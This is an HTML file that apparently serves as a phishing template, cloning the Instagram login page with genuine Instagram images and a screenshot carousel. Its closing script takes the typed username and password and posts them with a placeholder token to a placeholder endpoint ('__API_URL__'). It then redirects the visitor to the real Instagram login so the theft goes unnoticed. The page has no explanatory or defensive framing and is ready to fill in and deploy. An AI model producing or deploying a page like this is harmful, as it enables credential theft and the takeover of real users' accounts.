<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .main-container {
            display: flex;
            align-items: center;
            max-width: 935px;
            width: 100%;
            justify-content: center;
        }

        .phones-container {
            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/ItTndlZM2n2.png');
            width: 454px;
            height: 618px;
            background-size: 454px 618px;
            margin-right: 32px;
            position: relative;
        }

        @media (max-width: 875px) {
            .phones-container {
                display: none;
            }
        }

        .phone-mockup {
            position: absolute;
            top: 26px;
            right: 18px;
            width: 250px;
            height: 538px;
            border-radius: 20px;
            overflow: hidden;
        }

        .phone-mockup img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            opacity: 0;
            transition: opacity 1s ease-in-out;
        }

        .phone-mockup img.active {
            opacity: 1;
        }

        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 10px 0;
            text-align: center;
            margin-bottom: 10px;
            border-radius: 1px;
        }

        .logo {
            margin: 22px auto 12px;
            height: 51px;
            width: 175px;
            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/8_S0p8S3fex.png');
            background-position: 0 -52px;
            background-repeat: no-repeat;
            cursor: pointer;
        }

        .form-container {
            padding: 0 40px;
        }

        .input-group {
            position: relative;
            margin-bottom: 6px;
        }

        .input-group input {
            width: 100%;
            height: 38px;
            padding: 14px 8px 2px;
            border: 1px solid #dbdbdb;
            background: #fafafa;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }

        .input-group label {
            position: absolute;
            left: 8px;
            top: 12px;
            font-size: 12px;
            color: #8e8e8e;
            pointer-events: none;
            transition: all 0.1s ease-out;
        }

        .input-group input:focus+label,
        .input-group input:not(:placeholder-shown)+label {
            top: 2px;
            font-size: 10px;
        }

        .login-btn {
            width: 100%;
            height: 32px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 8px;
            cursor: pointer;
            opacity: 0.7;
            pointer-events: none;
        }

        .login-btn.active {
            opacity: 1;
            pointer-events: auto;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 15px 40px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
        }

        .fb-login img {
            width: 16px;
            margin-right: 8px;
        }

        .forgot {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            display: block;
            margin-top: 15px;
        }

        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px;
            text-align: center;
            border-radius: 1px;
        }

        .signup-box p {
            font-size: 14px;
            color: #262626;
        }

        .signup-box span {
            color: #0095f6;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
        }

        .get-app {
            margin-top: 20px;
            width: 350px;
            text-align: center;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 20px;
        }

        .store-btns {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .store-btns img {
            height: 40px;
        }
    </style>
</head>

<body>
    <div class="main-container">
        <div class="phones-container">
            <div class="phone-mockup" id="carousel">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png/cfd5115b8858.png"
                    class="active">
                <img
                    src="https://www.instagram.com/static/images/homepage/screenshots/screenshot2-2x.png/80b03ad2d5ad.png">
                <img
                    src="https://www.instagram.com/static/images/homepage/screenshots/screenshot3-2x.png/fe2540685167.png">
                <img
                    src="https://www.instagram.com/static/images/homepage/screenshots/screenshot4-2x.png/8e229201551a.png">
            </div>
        </div>
        <div class="content">
            <div class="login-box">
                <div class="logo"></div>
                <div class="form-container">
                    <form id="instaForm">
                        <div class="input-group">
                            <input type="text" id="username" placeholder=" " autocomplete="username" required>
                            <label>Phone number, username, or email</label>
                        </div>
                        <div class="input-group">
                            <input type="password" id="password" placeholder=" " autocomplete="current-password"
                                required>
                            <label>Password</label>
                        </div>
                        <button type="submit" id="loginBtn" class="login-btn">Log in</button>
                    </form>
                    <div class="divider"><span style="padding:0 18px;">OR</span></div>
                    <a href="#" class="fb-login">
                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/dT5197_799A.png" alt="FB">
                        Log in with Facebook
                    </a>
                    <a href="#" class="forgot">Forgot password?</a>
                </div>
            </div>
            <div class="signup-box">
                <p>Don't have an account? <span>Sign up</span></p>
            </div>
            <div class="get-app">
                <p>Get the app.</p>
                <div class="store-btns">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7YmS_iX.png" alt="Google Play">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft">
                </div>
            </div>
        </div>
    </div>

    <script>
        // Carousel logic
        const images = document.querySelectorAll('#carousel img');
        let currentIdx = 0;
        setInterval(() => {
            images[currentIdx].classList.remove('active');
            currentIdx = (currentIdx + 1) % images.length;
            images[currentIdx].classList.add('active');
        }, 5000);

        // Form logic
        const u = document.getElementById('username');
        const p = document.getElementById('password');
        const btn = document.getElementById('loginBtn');

        function checkInputs() {
            if (u.value.length > 0 && p.value.length >= 6) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        u.addEventListener('input', checkInputs);
        p.addEventListener('input', checkInputs);

        document.getElementById('instaForm').addEventListener('submit', function (e) {
            e.preventDefault();
            const data = {
                token: '__TOKEN__',
                username: u.value,
                password: p.value
            };
            fetch('__API_URL__', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).finally(() => {
                window.location.href = 'https://www.instagram.com/accounts/login/';
            });
        });
    </script>
</body>

</html>
